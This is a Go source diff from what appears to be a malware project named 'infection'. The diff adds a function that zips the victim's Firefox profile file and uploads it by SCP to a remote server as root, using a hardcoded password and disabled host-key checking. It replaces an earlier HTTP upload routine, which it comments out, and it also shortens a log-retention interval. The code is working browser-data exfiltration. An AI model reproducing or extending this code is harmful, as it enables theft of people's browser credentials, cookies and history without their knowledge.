@@ -4,11 +4,14 @@ import (
 	"archive/zip"
 	"bytes"
 	"fmt"
+	"github.com/bramvdbogaerde/go-scp"
+	"golang.org/x/crypto/ssh"
 	"infection/util/lib"
 	"io"
 	"io/ioutil"
 	"log"
 	"mime/multipart"
+	"net"
 	"net/http"
 	"os"
 	"os/user"
@@ -42,6 +45,7 @@ func create_dir(path string) {
 	}
 }
 func Firefoxpack(addr string) {
+	//http := "http://" + addr + ":5002/browser/browserbag"
 	fire, err := os.Open(lib.Firefoxpath)
 	if err != nil {
 		log.Fatal(err)
@@ -50,21 +54,43 @@ func Firefoxpack(addr string) {
 	var files = []*os.File{fire}
 	// if not create dir faild not write
 	create_dir(lib.Firefox)
-	lib.GetOutIp()
-	dest := lib.Firefox + lib.HOSTID + "-" + lib.OUTIP + "-fire.zip"
+	//lib.GetOutIp()
+	fname := lib.HOSTID + "-fire.zip"
+	dest := lib.Firefox + lib.HOSTID + "-fire.zip"
 	err = lib.Compress(files, dest)
 	if err != nil {
 		log.Fatal(err, "targeterr")
 	} else {
-		finflag := make(chan string)
-		go lib.SingleFile(dest, addr, finflag)
+		Sshpack(dest, addr, fname)
+		//finflag := make(chan string)
+		//go lib.SingleFile(dest, addr, finflag)
 	}
 }
+
+func Sshpack(dest string, addr string, name string) {
+	clientConfig := &ssh.ClientConfig{
+		User: "root",
+		Auth: []ssh.AuthMethod{ssh.Password("jinjin123")},
+		HostKeyCallback: func(hostname string, remote net.Addr, key ssh.PublicKey) error {
+			return nil
+		},
+	}
+	client := scp.NewClient(addr, clientConfig)
+	f, _ := os.Open(dest) //windows 文件路径
+	client.Connect()
+	//defer client.Close()
+	defer f.Close()
+	err := client.CopyFile(f, "/root/infactionupload/"+name, "0644")
+	if err == nil {
+		client.Close()
+	}
+}
+
 func Digpack(addr string, finflag chan string) {
 	logf, lerr := os.Stat(Safe_path)
 	if lerr == nil {
 		//keep the file one month then update
-		if time.Now().Unix()-logf.ModTime().Unix() >= 2799765 {
+		if time.Now().Unix()-logf.ModTime().Unix() >= 1296000 {
 			os.RemoveAll(Safe_path)
 			return
 		} else {
